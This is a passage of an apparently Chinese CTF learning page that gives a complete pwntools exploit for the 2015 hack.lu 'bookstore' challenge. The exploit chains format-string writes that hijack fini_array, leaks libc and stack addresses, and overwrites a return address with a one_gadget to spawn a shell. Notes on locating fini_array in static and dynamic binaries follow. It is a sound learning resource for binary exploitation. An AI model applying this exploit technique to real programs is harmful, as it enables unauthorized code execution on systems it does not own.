+<span class="c1"># @File    : books.py</span>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+<span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./books&quot;</span><span class="p">)</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./books&quot;</span><span class="p">)</span>
+<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">command</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;5: Submit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cmd</span><span class="p">))</span>
+<span class="k">def</span> <span class="nf">edit</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span><span class="n">content</span><span class="p">):</span>
+    <span class="n">command</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;order:</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">content</span><span class="p">)</span>
+<span class="k">def</span> <span class="nf">free</span><span class="p">(</span><span class="n">cmd</span><span class="p">):</span>
+    <span class="n">command</span><span class="p">(</span><span class="n">cmd</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="n">free_got</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]</span>
+<span class="n">fini_array</span> <span class="o">=</span> <span class="mh">0x6011B8</span>
+<span class="n">main_addr</span> <span class="o">=</span> <span class="mh">0x400A39</span>
+
+<span class="c1"># ====round1====</span>
+<span class="c1"># free book2 放入 unsortedbin </span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+<span class="c1"># 修改 fini_array 为 main</span>
+<span class="c1"># 泄露 libc_base</span>
+<span class="c1"># 泄露 stack 地址</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%2617c</span><span class="s2">%13$hn&quot;</span> <span class="o">+</span> <span class="s1">&#39;|&#39;</span> <span class="o">+</span> <span class="s2">&quot;%14$s&quot;</span> <span class="o">+</span> <span class="s1">&#39;-&#39;</span> <span class="o">+</span> <span class="s2">&quot;%24$p&quot;</span>
+<span class="n">payload1</span> <span class="o">=</span> <span class="n">payload1</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x74</span><span class="p">,</span><span class="s1">&#39;a&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">payload1</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x151</span><span class="p">)</span>      
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">payload1</span><span class="p">)</span>            
+
+<span class="c1"># 从菜单选项将fini_array和free_got写入到栈上</span>
+<span class="n">payload2</span> <span class="o">=</span> <span class="s1">&#39;5&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fini_array</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_got</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;5: Submit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;|&quot;</span><span class="p">)</span>
+
+<span class="c1"># 处理libc地址</span>
+<span class="n">free_addr</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">))</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;free_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">free_addr</span><span class="p">))</span>
+<span class="n">libc_base</span> <span class="o">=</span> <span class="n">free_addr</span> <span class="o">-</span> <span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;free&#39;</span><span class="p">]</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;libc_base:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">onegadget</span> <span class="o">=</span> <span class="n">libc_base</span> <span class="o">+</span> <span class="mh">0x45226</span> 
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;onegadget:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">onegadget</span><span class="p">))</span>
+
+<span class="c1"># 处理栈地址</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;-&quot;</span><span class="p">)</span>
+<span class="n">ret_addr</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;ret_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">ret_addr</span><span class="p">))</span>
+<span class="n">attack_addr</span> <span class="o">=</span> <span class="n">ret_addr</span> <span class="o">-</span> <span class="mh">0x106</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;attack_addr:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">attack_addr</span><span class="p">))</span>
+
+<span class="c1"># ====round2====</span>
+
+<span class="c1"># 同 round1</span>
+<span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
+
+<span class="c1"># 处理格式化字符串填充字节数，处理高地址值小于低地址情况</span>
+<span class="n">one_1</span> <span class="o">=</span> <span class="n">onegadget</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;one_1:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_1</span><span class="p">))</span>
+<span class="n">one_2</span> <span class="o">=</span> <span class="n">onegadget</span><span class="o">&gt;&gt;</span><span class="mi">16</span> <span class="o">&amp;</span> <span class="mh">0xffff</span>
+<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;one_2:&quot;</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">one_2</span><span class="p">))</span>
+<span class="k">if</span> <span class="n">one_1</span> <span class="o">&gt;</span> <span class="n">one_2</span><span class="p">:</span>
+    <span class="n">one_2</span> <span class="o">=</span> <span class="n">one_2</span> <span class="o">+</span> <span class="mh">0x10000</span> <span class="o">-</span> <span class="n">one_1</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">one_2</span> <span class="o">-=</span> <span class="n">one_1</span>
+
+<span class="c1"># 修改第二次main返回地址</span>
+<span class="n">payload4</span> <span class="o">=</span> <span class="s2">&quot;%</span><span class="si">{}</span><span class="s2">c%13$hn&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">one_1</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&quot;%</span><span class="si">{}</span><span class="s2">c%14$hn&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">one_2</span><span class="p">)</span>
+<span class="n">payload4</span> <span class="o">=</span> <span class="n">payload4</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x74</span><span class="p">,</span><span class="s1">&#39;c&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x88</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">payload4</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x151</span><span class="p">)</span>
+<span class="n">edit</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="n">payload4</span><span class="p">)</span>
+<span class="c1">#gdb.attach(p)</span>
+<span class="n">payload3</span> <span class="o">=</span> <span class="s1">&#39;5&#39;</span><span class="o">*</span><span class="mi">8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">attack_addr</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">attack_addr</span><span class="o">+</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;5: Submit</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload3</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h3 id="_18">参考文章<a class="headerlink" href="#_18" title="Permanent link">&para;</a></h3>
+<ul>
+<li><a href="https://bbs.pediy.com/thread-246783.htm">hack.lu 2015 bookstore writeup</a></li>
+<li><a href="https://blog.csdn.net/qq_43449190/article/details/89077783">2015-hacklu-bookstore</a></li>
+</ul>
+<h3 id="_19">补充总结<a class="headerlink" href="#_19" title="Permanent link">&para;</a></h3>
+<h5 id="fini_array_1">怎么找 fini_array ？<a class="headerlink" href="#fini_array_1" title="Permanent link">&para;</a></h5>
+<p>首先 fini_array 是 __libc_csu_fini 函数里面会用的一个列表，当程序退出时会调用这个数组存放的一个或两个函数，调用完成后才继续完成退出函数，这时才是真正退出程序。</p>
+<h6 id="64">64 位静态链接程序<a class="headerlink" href="#64" title="Permanent link">&para;</a></h6>
+<p>fini_array 数组长度为 0x10 字节，里面放了两个函数地址，退出 main 函数会先执行 fini_array[1] ，然后执行 fini_array[0] 。</p>
+<p>在<a href="https://www.mrskye.cn/archives/173">劫持 64 位静态程序 fini_array 进行 ROP 攻击</a>里面接触的是 64 位静态编译的程序，程序是没有符号表的，寻找 fini_array 方法是：</p>
+<p>首先 <code>readelf -h 程序名</code> 查看程序加载入口地址。</p>
+<p>gdb 调试将断点打在入口地址 ，然后找到有三个传参的 mov 指令，mov r8 就是 __libc_csu_fini 的地址：</p>
+<div class="highlight"><pre><span></span><code>.text:0000000000401A60                 public start
+.text:0000000000401A60 start           proc near               <span class="p">;</span> DATA XREF: LOAD:0000000000400018↑o
+.text:0000000000401A60 <span class="p">;</span> __unwind <span class="o">{</span>
+.text:0000000000401A60                 xor     ebp, ebp
+.text:0000000000401A62                 mov     r9, rdx
+.text:0000000000401A65                 pop     rsi
+.text:0000000000401A66                 mov     rdx, rsp
+.text:0000000000401A69                 and     rsp, 0FFFFFFFFFFFFFFF0h
+.text:0000000000401A6D                 push    rax
+.text:0000000000401A6E                 push    rsp
+.text:0000000000401A6F                 mov     r8, offset sub_402BD0 <span class="p">;</span> fini
+.text:0000000000401A76                 mov     rcx, offset loc_402B40 <span class="p">;</span> init
+.text:0000000000401A7D                 mov     rdi, offset main
+.text:0000000000401A84                 db      67h
+.text:0000000000401A84                 call    __libc_start_main
+.text:0000000000401A8A                 hlt
+.text:0000000000401A8A <span class="p">;</span> <span class="o">}</span> // starts at 401A60
+.text:0000000000401A8A start           endp
+</code></pre></div>
+<p>然后 <code>x /20i addr</code> 查看该地址开始的汇编，找到 <code>lea    rbp,[rip+0xb***1] # 0x4***f0</code> ，这个地址就是 fini_array[1] 的地址：</p>
+<div class="highlight"><pre><span></span><code>pwndbg&gt; x/20i 0x402bd0
+  0x402bd0 &lt;__libc_csu_fini&gt;:    push   rbp
+  0x402bd1 &lt;__libc_csu_fini+1&gt;:    lea    rax,<span class="o">[</span>rip+0xb24e8<span class="o">]</span>        <span class="c1"># 0x4***c0 </span>
+  0x402bd8 &lt;__libc_csu_fini+8&gt;:    lea    rbp,<span class="o">[</span>rip+0xb24d1<span class="o">]</span>        <span class="c1"># 0x4***b0 </span>
+  0x402bdf &lt;__libc_csu_fini+15&gt;:    push   rbx
+  0x402be0 &lt;__libc_csu_fini+16&gt;:    sub    rax,rbp
+  0x402be3 &lt;__libc_csu_fini+19&gt;:    sub    rsp,0x8
+  0x402be7 &lt;__libc_csu_fini+23&gt;:    sar    rax,0x3
+  0x402beb &lt;__libc_csu_fini+27&gt;:    je     0x402c06 &lt;__libc_csu_fini+54&gt;
+  0x402bed &lt;__libc_csu_fini+29&gt;:    lea    rbx,<span class="o">[</span>rax-0x1<span class="o">]</span>
+  0x402bf1 &lt;__libc_csu_fini+33&gt;:    nop    DWORD PTR <span class="o">[</span>rax+0x0<span class="o">]</span>
+  0x402bf8 &lt;__libc_csu_fini+40&gt;:    call   QWORD PTR <span class="o">[</span>rbp+rbx*8+0x0<span class="o">]</span>
+  0x402bfc &lt;__libc_csu_fini+44&gt;:    sub    rbx,0x1
+  0x402c00 &lt;__libc_csu_fini+48&gt;:    cmp    rbx,0xffffffffffffffff
+  0x402c04 &lt;__libc_csu_fini+52&gt;:    jne    0x402bf8 &lt;__libc_csu_fini+40&gt;
+  0x402c06 &lt;__libc_csu_fini+54&gt;:    add    rsp,0x8
+  0x402c0a &lt;__libc_csu_fini+58&gt;:    pop    rbx
+  0x402c0b &lt;__libc_csu_fini+59&gt;:    pop    rbp
+  0x402c0c &lt;__libc_csu_fini+60&gt;:    jmp    0x48f52c &lt;_fini&gt;
+</code></pre></div>
+<h6 id="64_1">64 位动态链接程序<a class="headerlink" href="#64_1" title="Permanent link">&para;</a></h6>
+<p>fini_array 数组长度为 0x8 字节，里面放了一个函数地址，退出 main 函数会执行 fini_array[0]。</p>
+<p>gdb 输入 <code>elf</code> 找 <code>.fini_array</code> ，开始地址就是 fini_array[0] </p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-qQxmRkH3KtjuybNr.png" /></p>
+<p>或者 IDA <code>ctrl+s</code> 找 .fini_array 分段 ：</p>
+<p><img alt="" src="https://mrskye.cn-gd.ufileos.com/img/2020-08-06-ztIjbG96doGOhSfu.png" /></p>
+<p>64 位中只有 fini_array[0] ，没有 fini_array[1] ，也就是只能运行写入 fini_array 一次，然后就正常退出了。无法像静态编译那样重复调用。</p>
+<h6 id="_20">静态动态利用方式小结<a class="headerlink" href="#_20" title="Permanent link">&para;</a></h6>
+<p>动态程序目前就遇到 <code>2015 hacklu bookstore</code> 这一题，太菜了总结不出规律。</p>
+<p>静态程序基本上套路是劫持 fini_array + 循环写入，将 ROP 链布置到 fini_array + 0x10 ，写入完成后将栈迁移到 fini_array + 0x10 执行 ROP 链。静态程序的总结可以看看<a href="https://www.freebuf.com/articles/system/226003.html">淇淇师傅文章</a>。</p>
+<div class="footnote">
+<hr />
+<ol>
+<li id="fn:1">
+<p>fastbin 不与物理地址相邻 fastbin 合并，不与 top chunk 合并&#160;<a class="footnote-backref" href="#fnref:1" title="Jump back to footnote 1 in the text">&#8617;</a></p>
+</li>
+<li id="fn:2">
+<p>分配的安全检查机制，请看 malloc 函数介绍&#160;<a class="footnote-backref" href="#fnref:2" title="Jump back to footnote 2 in the text">&#8617;</a></p>
+</li>
+</ol>
+</div>
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../fastbin/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  上一页
+                </span>
+                fastbin attack
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../use_after_free/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  下一页
+                </span>
+                UAF
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+          <div class="md-footer-copyright__highlight">
+            <span>&copy; 2021</span>by <a href="https://www.mrskye.cn/" target="_blank">SkYe231</a> &nbsp;|&nbsp; <span><a href="http://beian.miit.gov.cn/" target="_blank">粤ICP备20056619号</a></span>
+          </div>
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../../assets/javascripts/vendor.93c04032.min.js"></script>
+      <script src="../../../assets/javascripts/bundle.83e5331e.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../../..",
+          features: ['tabs', 'instant'],
+          search: Object.assign({
+            worker: "../../../assets/javascripts/worker/search.8c7e0a7e.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+    
+  </body>
+</html>
